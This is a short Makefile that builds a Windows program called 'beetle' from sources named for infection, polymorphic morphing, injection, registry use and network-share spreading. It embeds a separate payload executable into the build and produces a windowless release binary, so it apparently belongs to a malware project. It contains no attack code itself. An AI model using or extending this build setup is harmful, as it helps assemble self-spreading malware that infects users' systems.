SRC=main.cpp common.cpp mem.cpp file.cpp dbg.cpp ldasm.cpp morf.cpp crc32.cpp rnd.cpp infect.cpp find.cpp loader32.cpp inject.cpp reg.cpp shares.cpp
NAME=beetle
OUT=$(NAME).exe
DEBUG=debug
RELEASE=release
LIBS=ntdll.lib kernel32.lib advapi32.lib user32.lib Mpr.lib
PAYLOAD=../example/release/example.exe
TOOLS=.\..\tools
b_debug:$(DEBUG)
	$(TOOLS)\bin2src.py $(PAYLOAD) payload32 payload32.h
	@cl $(SRC) /Fo$(DEBUG)/ /Fd$(DEBUG)/vc.pdb /c /GS- /Gz /TP /ZI /nologo /W0 /D _DEBUG
	@cl loader.cpp /Fo$(DEBUG)/ /c /GL /Gy /GS- /Gz /TP /Od /W0 /nologo 
    @link $(DEBUG)/*.obj /OUT:$(DEBUG)/$(OUT) /PDB:$(DEBUG)/$(NAME).pdb /LTCG /NOLOGO /NODEFAULTLIB /DEBUG /SUBSYSTEM:CONSOLE,5.01 /ENTRY:"entry" /DYNAMICBASE /FIXED:No $(LIBS)
	@del $(DEBUG)\*.obj
	@del $(DEBUG)\*.idb
$(DEBUG):
	@mkdir $(DEBUG)	
b_release:$(RELEASE)
	$(TOOLS)\bin2src.py $(PAYLOAD) payload32 payload32.h
	@cl $(SRC) /Fo$(RELEASE)/ /Fd$(RELEASE)/vc.pdb /c /GL /Gy /GS- /Gz /TP /Od /W0 /nologo
	@cl loader.cpp /Fo$(RELEASE)/ /c /GL /Gy /GS- /Gz /TP /Od /W0 /nologo 
	@link $(RELEASE)/*.obj /OUT:$(RELEASE)/$(OUT) /LTCG /NOLOGO /NODEFAULTLIB /SUBSYSTEM:WINDOWS,5.01 /ENTRY:"entry" /DYNAMICBASE /FIXED:No $(LIBS)
	@del $(RELEASE)\*.obj
$(RELEASE):
	@mkdir $(RELEASE)